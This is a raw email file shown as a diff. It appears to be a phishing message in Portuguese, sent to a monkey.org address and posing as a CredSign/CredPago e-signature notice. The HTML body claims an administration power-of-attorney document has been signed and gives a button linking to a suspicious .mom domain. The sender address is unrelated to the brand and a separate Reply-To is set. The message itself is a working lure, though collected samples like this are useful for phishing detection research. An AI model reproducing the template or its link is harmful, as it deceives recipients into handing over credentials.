@@ -1,0 +1,115 @@
+Return-Path: vagas@pantchoshouse.com.br
+Delivered-To: jose@monkey.org
+X-FDA: 82022309250.17.AE2F397
+Received: from mail49230.delibird0003.locaweb.com.br
+ (mail49230.delibird0003.locaweb.com.br [201.76.49.230])	by
+ imf05.b.hostedemail.com (Postfix) with ESMTP id 5B5FC1C0007	for
+ <jose@monkey.org>; Thu, 18 Apr 2024 10:40:43 +0000 (UTC)
+Authentication-Results: imf05.b.hostedemail.com;	dkim=none;	spf=pass
+ (imf05.b.hostedemail.com: domain of vagas@pantchoshouse.com.br designates
+ 201.76.49.230 as permitted sender) smtp.mailfrom=vagas@pantchoshouse.com.br;
+	dmarc=pass (policy=none) header.from=pantchoshouse.com.br
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1713436844; a=rsa-sha256;
+	cv=none;
+	b=ihrhc3X6/OZC+p1L0WJHSUBtDPS+1S3KiAiQ/HIJ3xPabyMAJ6jDjSfSlOAHTlvqeFKisv
+	upkxCsJBOl6BRJP7zR99RSx/BkxGVzqxgxY6bnyT13mPltIyal2+xRTHRO2rZIrTtXP8Yp
+	iQWAqiNVlr6Yj1NJFv30lNrW6WLdHMs=
+ARC-Authentication-Results: i=1;	imf05.b.hostedemail.com;	dkim=none;	spf=pass
+ (imf05.b.hostedemail.com: domain of vagas@pantchoshouse.com.br designates
+ 201.76.49.230 as permitted sender) smtp.mailfrom=vagas@pantchoshouse.com.br;
+	dmarc=pass (policy=none) header.from=pantchoshouse.com.br
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1713436844;
+	h=from:from:sender:reply-to:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:content-transfer-encoding:in-reply-to:	 references;
+ bh=NyUltYdpgCSYvD9NNLx4rNqLOPiHrD8iZ0Z7B7MyMXM=;
+	b=j8m8rhI/vmLDSIzuAA4kzN6Wk0Fh3517Yd3GrAwIIX6hxn1618tJ1OuikWYvwedk275Snc
+	JJ/2tmrRpajfvSnPj/sse8gVfDVuMS9Etk0jjwP7BRk/rajuY62Eqr2hFL8tJoVYIpEfOn
+	dcf5sPxYJR9j3NwEJKW6vMH6sUpGMHg=
+Received: from mcbain0008.email.locaweb.com.br (189.126.112.84) by
+ mail492.delibird0003.locaweb.com.br id h43s5i2n8lg5 for <jose@monkey.org>;
+ Thu, 18 Apr 2024 07:39:20 -0300 (envelope-from <vagas@pantchoshouse.com.br>)
+Received: from proxy.email-ssl.com.br (unknown [10.31.120.245])
+	by mcbain0008.email.locaweb.com.br (Postfix) with ESMTP id 3EA624085E
+	for <jose@monkey.org>; Thu, 18 Apr 2024 07:34:15 -0300 (-03)
+x-locaweb-id: =?utf-8?q?408o9JR=5FcAilUGgos8f1AQjU3w1kJ98=5F60cbEewfSleTNwRW?=
+ =?utf-8?q?QgqKfTidH5j5k7-iDQaCaMVzR166gKgfoowM5aBrM0uRQzYnr6iNvqxSXd-rYyab8?=
+ =?utf-8?q?4298d1FMS1ZmcGKmpR1ImzrXZxS3qz-2izIft1Xln29wm89xKXgnBvxosgs-r6pQh?=
+ =?utf-8?q?QPItI6UiTVeWePmzx-9jfWshSkKdLU--4s=5Fmp7x=5Fg7zbFFdSbYGrDNzTE=3D?=
+ NzY2MTY3NjE3MzQwNzA2MTZlNzQ2MzY4NmY3MzY4NmY3NTczNjUyZTYzNmY2ZDJlNjI3Mg==
+X-LocaWeb-COR: locaweb_2009_x-mail
+X-AuthUser: vagas@pantchoshouse.com.br
+Received: from server-26-279-195-8.lhr6.r.cloudfront.net (unknown
+ [170.81.104.220])	(Authenticated sender: vagas@pantchoshouse.com.br)	by
+ proxy.email-ssl.com.br (Postfix) with ESMTPSA id 74E522A009D	for
+ <jose@monkey.org>; Thu, 18 Apr 2024 07:40:37 -0300 (-03)
+From: "Vagas" <vagas@pantchoshouse.com.br>
+Subject: CREDSIGN-ADM - 0544596807 - Documento para jose@monkey.org
+ 18/04/2024 07:40:36
+To: jose@monkey.org
+Content-Type: multipart/alternative;
+ boundary="bYahMC=_n4jU959kjwYmUUCSMGyePtn1Fc"
+MIME-Version: 1.0
+Reply-To: 2tdy@pantchoshouse.com.br
+Date: Thu, 18 Apr 2024 07:40:38 -0300
+Message-Id: <20240418104038.74E522A009D@proxy.email-ssl.com.br>
+X-Rspamd-Server: rspam07
+X-Stat-Signature: ay1kdirwwx4bs8hihs4iycx5qjxzmbyp
+X-Rspam-User: 
+X-Rspamd-Queue-Id: 5B5FC1C0007
+X-Spam-Status: No, score=-1.85
+X-HE-Tag: 1713436843-749759
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1/leVaT417OBzJM+ubZvOH+1/YzrCZzDtuSsuMXES4rVr8?=
+ =?utf-8?q?r6kUxuYNGNOhXpMQmNHHknWG0RBmZtcMw7n/l+4QP4saixHy9HbrB/s1N9uHhhv5L?=
+ =?utf-8?q?YM5yOoNPlw2SWn021hw6B2RWYfsGCWg8f2ssnRee9gqfZNVtVl/o7bWWKhFumAabY?=
+ =?utf-8?q?N2smlI1vtJfTwCVzLVGvhI+PdWg+2mIGOrAeU/qMy3mSf8QS+fxlmsOg99Wz4lctN?=
+ =?utf-8?q?4b7UwxPFfrywyV010uQIMlBr4Ysd1BGGWlr5MsgAGgFPJzwPn5h/o/B4htYMeWjnB?=
+ =?utf-8?q?/B2eoUwlPVJucRO7LJQzdP3o5/ufZfF53g+onf3/BBRX0CLFYYUor42WWs5wPjBAS?=
+ =?utf-8?q?jJrUcSFZnYFwo83EQEyi49ntJ9VbX/wYI0AswG1jhg5ZnxOLMofqFBW8guBACnhpt?=
+ =?utf-8?q?xYrtmoh9W5Tzlg=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 112
+
+This is a multi-part message in MIME format
+
+--bYahMC=_n4jU959kjwYmUUCSMGyePtn1Fc
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+Content-Disposition: inline
+
+An HTML viewer is required to see this message
+
+--bYahMC=_n4jU959kjwYmUUCSMGyePtn1Fc
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: 8bit
+Content-Disposition: inline
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+</head>
+<body style="font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 0; background: linear-gradient(135deg, #e2f0f9, #f9e2f2);">
+    <div style="max-width: 600px; margin: 20px auto; background-color: #ffffff; border-radius: 10px; box-shadow: 0 6px 12px rgba(0,0,0,0.15);">
+        <div style="height: 150px; border-radius: 10px 10px 0 0; background: linear-gradient(to right, #a4c7f3, #f3e2a9); box-shadow: inset 0 -1px 6px rgba(0,0,0,0.08);">
+            <img src="https://uploaddeimagens.com.br/images/002/320/842/full/credsign-title.jpg?YxnqlJKMTWCV6866.T1Wq" style="width: 100%; height: 100%; border-radius: 10px 10px 0 0; object-fit: cover;">
+        </div>
+        <div style="padding: 20px; text-align: center; color: #333;">
+            <h1 style="color: #5577cc; text-shadow: 1px 1px 1px rgba(0,0,0,0.15);">Ol&#225; jose@monkey.org!</h1>
+            <p style="font-size: 16px; color: #555; text-shadow: 0 0 1px rgba(0,0,0,0.1);">Seu documento <strong>Procura&#231;&#227;o para Administra&#231;&#227;o</strong> foi assinado por todos os envolvidos.</p>
+            <a href="http://flifinmenkil.incluirdocumentoseativar.mom/GDcAJWIzCqQlJuLF2ltiTkThsfObvL/C24p1VE/l10AEaL1ZM1Z9/2TQVNUXc1CnRJk/YxnqlJKMTWCV6866.T1Wq" style="display: inline-block; padding: 12px 24px; margin: 20px 0; background-color: #5599ff; color: #ffffff; border-radius: 5px; text-decoration: none; font-weight: bold; box-shadow: 1px 1px 2px rgba(0,0,0,0.2);">Clique aqui para visualizar</a>
+        </div>
+        <div style="font-size: 12px; text-align: center; color: #6082b6; padding: 20px; background: linear-gradient(to top, #d0e2ff, #ffffff); box-shadow: inset 0 1px 3px rgba(0,0,0,0.08);">
+            Todos os direitos reservados a CredPago
+        </div>
+    </div>
+</body>
+</html>
+
+
+--bYahMC=_n4jU959kjwYmUUCSMGyePtn1Fc--
+
+
